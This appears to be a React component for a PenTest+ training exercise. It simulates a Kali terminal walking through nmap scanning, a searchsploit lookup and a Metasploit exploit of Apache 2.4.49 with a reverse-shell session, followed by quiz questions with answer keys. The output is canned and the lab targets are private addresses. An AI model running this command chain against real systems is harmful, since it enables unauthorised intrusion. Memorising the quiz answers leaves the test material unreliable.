import { useState, useRef, useEffect, useCallback } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Zap, Lock, Globe, ChevronRight } from 'lucide-react';
import { ProgressTracker } from './shared/ProgressTracker';
import type { PBQMetadata } from './shared/types';

export const terminalMetadata: PBQMetadata = {
  id: 'terminal-sim',
  title: 'Interactive Terminal',
  description: 'Navigate a realistic terminal simulation. Run nmap scans, interpret output, and select the correct exploit path to compromise the target.',
  difficulty: 3,
  category: 'PenTest+',
  tags: ['terminal', 'nmap', 'exploitation'],
  xpReward: 60,
  estimatedTime: '10 min',
};

interface CommandEntry {
  id: string;
  input: string;
  output: string[];
  phase: 'scan' | 'identify' | 'exploit';
  unlocked: boolean;
  completed: boolean;
}

const COMMANDS: CommandEntry[] = [
  {
    id: 'cmd1',
    input: 'nmap -sS -p- 192.168.1.105',
    output: [
      'Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 09:32 EST',
      'Nmap scan report for 192.168.1.105',
      'Host is up (0.0032s latency).',
      'Not shown: 65529 closed tcp ports (reset)',
      'PORT      STATE SERVICE',
      '22/tcp    open  ssh',
      '80/tcp    open  http',
      '3306/tcp  open  mysql',
      '8080/tcp  open  http-proxy',
      '9000/tcp  open  cslistener',
      'Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds',
    ],
    phase: 'scan',
    unlocked: true,
    completed: false,
  },
  {
    id: 'cmd2',
    input: 'nmap -sV -sC -p 80,8080,9000 192.168.1.105',
    output: [
      'Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-15 09:35 EST',
      'Nmap scan report for 192.168.1.105',
      'PORT   STATE SERVICE VERSION',
      '80/tcp open  http    Apache httpd 2.4.49 ((Debian))',
      '|_http-title: Apache2 Debian Default Page',
      '8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1',
      '|_http-title: Tomcat Web Application Manager',
      '9000/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0)',
      '|_http-title: Login Page',
      'Service detection performed. Please report any incorrect results.',
      'Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds',
    ],
    phase: 'identify',
    unlocked: false,
    completed: false,
  },
  {
    id: 'cmd3',
    input: 'searchsploit Apache 2.4.49',
    output: [
      'Exploit Title                                   |  Path',
      '------------------------------------------------|-------------------------------',
      'Apache HTTP Server 2.4.49 - Path Traversal      | linux/webapps/50383.py',
      'Apache HTTP Server 2.4.49 - Remote Code Exec    | linux/webapps/50384.py',
      'Apache HTTP Server 2.4.49 - LFI to RCE          | multiple/local/50512.py',
      '',
      'Shellcodes: No Results',
    ],
    phase: 'identify',
    unlocked: false,
    completed: false,
  },
  {
    id: 'cmd4',
    input: 'msfconsole -q -x "use exploit/multi/http/apache_normalize_path_rce; set RHOSTS 192.168.1.105; exploit"',
    output: [
      '[*] Using exploit/multi/http/apache_normalize_path_rce',
      '[*] No payload configured, defaulting to cmd/unix/reverse_bash',
      'RHOSTS => 192.168.1.105',
      '[*] Started reverse TCP handler on 192.168.1.50:4444',
      '[*] Running automatic check ("set AutoCheck false" to disable)',
      '[+] The target is vulnerable.',
      '[*] Sending stage (989032 bytes) to 192.168.1.105',
      '[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.105:54321)',
      '',
      'meterpreter > getuid',
      'Server username: www-data',
      'meterpreter > sysinfo',
      'Computer    : target.local',
      'OS          : Linux 5.15.0 #1 SMP x86_64',
      '',
      '[+] Target compromised successfully!',
    ],
    phase: 'exploit',
    unlocked: false,
    completed: false,
  },
];

const MCQ_QUESTIONS = [
  {
    phase: 'scan',
    question: 'Based on the nmap scan, which port is most likely running a web application framework?',
    options: ['22 (SSH)', '80 (HTTP)', '3306 (MySQL)', '8080 (HTTP-Proxy)'],
    correct: 3,
    hint: 'Look for non-standard HTTP ports with application server signatures.',
  },
  {
    phase: 'identify',
    question: 'Which CVE applies to the Apache 2.4.49 path traversal vulnerability?',
    options: ['CVE-2021-41773', 'CVE-2023-25690', 'CVE-2022-31813', 'CVE-2021-44228'],
    correct: 0,
    hint: 'This is a well-known 2021 vulnerability in Apache HTTP Server.',
  },
];

interface Props {
  onComplete?: (score: number) => void;
}

export default function TerminalPBQ({ onComplete }: Props) {
  const [commands, setCommands] = useState<CommandEntry[]>(COMMANDS);
  const [terminalLines, setTerminalLines] = useState<string[]>([
    '┌─────────────────────────────────────────────────────────────┐',
    '│  KALI LINUX TERMINAL v2024.1         root@kali:~            │',
    '│  Target: 192.168.1.105 (PTES-STD)                           │',
    '└─────────────────────────────────────────────────────────────┘',
    '',
    'Type "help" for available commands. Objective: Scan, Identify, Exploit.',
    '',
  ]);
  const [currentPhase, setCurrentPhase] = useState<'scan' | 'identify' | 'exploit'>('scan');
  const [inputValue, setInputValue] = useState('');
  const [showMcq, setShowMcq] = useState(false);
  const [mcqIndex, setMcqIndex] = useState(0);
  const [score, setScore] = useState(0);
  const [completed, setCompleted] = useState(false);
  const [typingOutput, setTypingOutput] = useState<string[]>([]);
  const [isTyping, setIsTyping] = useState(false);
  const terminalRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (terminalRef.current) {
      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
    }
  }, [terminalLines, typingOutput]);

  const typeOutput = useCallback(async (lines: string[]) => {
    setIsTyping(true);
    for (const line of lines) {
      await new Promise(r => setTimeout(r, 100 + Math.random() * 200));
      setTypingOutput(prev => [...prev, line]);
    }
    setIsTyping(false);
  }, []);

  const executeCommand = useCallback((cmdEntry: CommandEntry) => {
    const newLines = [
      `\x1b[32mroot@kali:\x1b[0m~# ${cmdEntry.input}`,
      ...cmdEntry.output,
      '',
    ];

    setTerminalLines(prev => [...prev, `root@kali:~# ${cmdEntry.input}`, ...cmdEntry.output, '']);
    setTypingOutput([]);

    // Mark command as completed and unlock next
    setCommands(prev => {
      const updated = prev.map(c => c.id === cmdEntry.id ? { ...c, completed: true } : c);
      const nextIdx = prev.findIndex(c => c.id === cmdEntry.id) + 1;
      if (nextIdx < prev.length) {
        updated[nextIdx] = { ...updated[nextIdx], unlocked: true };
      }
      return updated;
    });

    // Check if phase complete
    const phaseCommands = commands.filter(c => c.phase === currentPhase);
    const phaseCompleted = phaseCommands.every(c => c.id === cmdEntry.id ? true : c.completed);
    if (phaseCompleted && currentPhase !== 'exploit') {
      setShowMcq(true);
    }

    if (cmdEntry.phase === 'exploit') {
      setScore(100);
      setCompleted(true);
      onComplete?.(100);
    }
  }, [commands, currentPhase, onComplete]);

  const handleInput = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && inputValue.trim()) {
      const cmd = commands.find(c => c.unlocked && !c.completed && c.input.toLowerCase().includes(inputValue.toLowerCase()));
      if (cmd) {
        executeCommand(cmd);
        setInputValue('');
      } else {
        setTerminalLines(prev => [...prev, `root@kali:~# ${inputValue}`, 'Command not found or not available yet.', '']);
        setInputValue('');
      }
    }
  };

  const handleMcqAnswer = (selected: number) => {
    const mcq = MCQ_QUESTIONS[mcqIndex];
    const isCorrect = selected === mcq.correct;
    if (isCorrect) {
      setScore(prev => prev + 30);
      setTerminalLines(prev => [...prev, `[+] Correct! Moving to next phase...`, '']);
    } else {
      setTerminalLines(prev => [...prev, `[-] Incorrect. ${mcq.hint}`, '']);
    }
    setShowMcq(false);

    const nextPhase = currentPhase === 'scan' ? 'identify' : 'exploit';
    setCurrentPhase(nextPhase);
  };

  const availableCommands = commands.filter(c => c.unlocked && !c.completed);

  return (
    <div className="w-full">
      <div className="flex items-center justify-between mb-4">
        <div className="flex items-center gap-3">
          <Terminal size={18} className="text-[#00ff41]" />
          <span className="text-caption text-[#7da0c4] font-display uppercase">Target: 192.168.1.105</span>
        </div>
        <ProgressTracker current={completed ? 3 : currentPhase === 'scan' ? 0 : currentPhase === 'identify' ? 1 : 2} total={3} score={score} />
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-[75%_25%] gap-4">
        {/* Terminal Window */}
        <div className="bg-[#0c0c0c] border border-[#1a2d45] rounded-xl overflow-hidden shadow-2xl">
          {/* Terminal header */}
          <div className="flex items-center gap-2 px-4 py-2 bg-[#1a1a1a] border-b border-[#2a2a2a]">
            <div className="w-3 h-3 rounded-full bg-[#ff5f56]" />
            <div className="w-3 h-3 rounded-full bg-[#ffbd2e]" />
            <div className="w-3 h-3 rounded-full bg-[#27c93f]" />
            <span className="ml-3 text-caption text-[#4a6682] font-display">root@kali: ~</span>
          </div>

          {/* Terminal body */}
          <div
            ref={terminalRef}
            className="h-[400px] overflow-y-auto p-4 font-mono text-sm scrollbar-thin"
            onClick={() => inputRef.current?.focus()}
          >
            <AnimatePresence>
              {terminalLines.map((line, i) => (
                <motion.div
                  key={`${i}-${line.substring(0, 20)}`}
                  initial={{ opacity: 0, x: -10 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ duration: 0.1 }}
                  className={`mb-0.5 ${
                    line.startsWith('root@kali:') ? 'text-[#00ff41]' :
                    line.includes('[+]') ? 'text-[#00ff41]' :
                    line.includes('[-]') || line.includes('Error') ? 'text-[#ff3366]' :
                    line.includes('[*]') ? 'text-[#00d4ff]' :
                    line.includes('PORT') || line.includes('Exploit Title') ? 'text-[#ffaa00]' :
                    line.includes('open') ? 'text-[#00ff41]' :
                    line.includes('closed') ? 'text-[#ff3366]' :
                    line.includes('|_') ? 'text-[#a855f7]' :
                    'text-[#e0f2fe]'
                  }`}
                >
                  {line}
                </motion.div>
              ))}
            </AnimatePresence>

            {isTyping && typingOutput.map((line, i) => (
              <motion.div
                key={`typing-${i}`}
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="text-[#e0f2fe] mb-0.5"
              >
                {line}
              </motion.div>
            ))}

            {/* Input line */}
            {!completed && !showMcq && (
              <div className="flex items-center gap-2 mt-2">
                <span className="text-[#00ff41] font-mono text-sm">root@kali:~#</span>
                <input
                  ref={inputRef}
                  type="text"
                  value={inputValue}
                  onChange={e => setInputValue(e.target.value)}
                  onKeyDown={handleInput}
                  className="flex-1 bg-transparent border-none outline-none text-[#e0f2fe] font-mono text-sm caret-[#00ff41]"
                  autoComplete="off"
                  spellCheck={false}
                />
                <motion.span
                  animate={{ opacity: [1, 0, 1] }}
                  transition={{ duration: 1, repeat: Infinity }}
                  className="w-2 h-4 bg-[#00ff41] ml-1"
                />
              </div>
            )}

            {completed && (
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="mt-4 p-3 border border-[#00ff41] rounded-lg bg-[rgba(0,255,65,0.05)]"
              >
                <div className="flex items-center gap-2 text-[#00ff41] font-display font-bold">
                  <Lock size={16} />
                  TARGET COMPROMISED — SESSION ACTIVE
                </div>
              </motion.div>
            )}
          </div>
        </div>

        {/* Side Panel */}
        <div className="space-y-3">
          <div className="bg-[#0d1526] border border-[#1a2d45] rounded-lg p-4">
            <h4 className="font-display font-semibold text-sm text-[#e0f2fe] mb-2 flex items-center gap-2">
              <Zap size={14} className="text-[#ffaa00]" />
              Phase: {currentPhase.toUpperCase()}
            </h4>
            <div className="space-y-2">
              {['scan', 'identify', 'exploit'].map(phase => (
                <div key={phase} className="flex items-center gap-2">
                  <div className={`w-2 h-2 rounded-full ${
                    phase === currentPhase ? 'bg-[#00d4ff] animate-pulse' :
                    phase === 'scan' && currentPhase !== 'scan' ? 'bg-[#00ff41]' :
                    phase === 'identify' && currentPhase === 'exploit' ? 'bg-[#00ff41]' :
                    'bg-[#1a2d45]'
                  }`} />
                  <span className={`text-xs font-display capitalize ${
                    phase === currentPhase ? 'text-[#00d4ff]' :
                    (phase === 'scan' && currentPhase !== 'scan') || (phase === 'identify' && currentPhase === 'exploit') ? 'text-[#00ff41]' :
                    'text-[#4a6682]'
                  }`}>
                    {phase}
                  </span>
                </div>
              ))}
            </div>
          </div>

          <div className="bg-[#0d1526] border border-[#1a2d45] rounded-lg p-4">
            <h4 className="font-display font-semibold text-xs text-[#7da0c4] mb-2">AVAILABLE COMMANDS</h4>
            <div className="space-y-1.5">
              {commands.map(cmd => (
                <div
                  key={cmd.id}
                  className={`flex items-center gap-2 text-xs font-mono p-1.5 rounded ${
                    cmd.completed ? 'text-[#00ff41] bg-[rgba(0,255,65,0.05)]' :
                    cmd.unlocked ? 'text-[#e0f2fe] bg-[#111d2e] cursor-pointer hover:border-[#00d4ff]' :
                    'text-[#4a6682] bg-transparent'
                  }`}
                  onClick={() => cmd.unlocked && !cmd.completed && executeCommand(cmd)}
                >
                  <ChevronRight size={10} className={cmd.completed ? 'text-[#00ff41]' : cmd.unlocked ? 'text-[#00d4ff]' : 'text-[#4a6682]'} />
                  <span className="truncate">{cmd.input.substring(0, 35)}...</span>
                </div>
              ))}
            </div>
          </div>

          <div className="bg-[#0d1526] border border-[#1a2d45] rounded-lg p-4">
            <h4 className="font-display font-semibold text-xs text-[#7da0c4] mb-1">OBJECTIVE</h4>
            <p className="text-xs text-[#e0f2fe]">
              Complete the penetration testing workflow: Scan the target, identify the vulnerability, then exploit it to gain access.
            </p>
          </div>
        </div>
      </div>

      {/* MCQ Modal */}
      <AnimatePresence>
        {showMcq && mcqIndex < MCQ_QUESTIONS.length && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50"
            onClick={() => setShowMcq(false)}
          >
            <motion.div
              initial={{ scale: 0.8, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.8, y: 20 }}
              className="bg-[#0d1526] border border-[#1a2d45] rounded-xl p-6 max-w-lg w-full mx-4"
              onClick={e => e.stopPropagation()}
            >
              <h3 className="text-h4 text-[#e0f2fe] mb-4 font-display">
                {MCQ_QUESTIONS[mcqIndex].question}
              </h3>
              <div className="space-y-2">
                {MCQ_QUESTIONS[mcqIndex].options.map((opt, i) => (
                  <motion.button
                    key={i}
                    whileHover={{ scale: 1.02, x: 4 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={() => handleMcqAnswer(i)}
                    className="w-full text-left px-4 py-3 border border-[#1a2d45] rounded-lg text-sm text-[#e0f2fe] font-mono hover:border-[#00d4ff] hover:bg-[rgba(0,212,255,0.05)] transition-all"
                  >
                    <span className="text-[#00d4ff] mr-2">{String.fromCharCode(65 + i)}.</span>
                    {opt}
                  </motion.button>
                ))}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
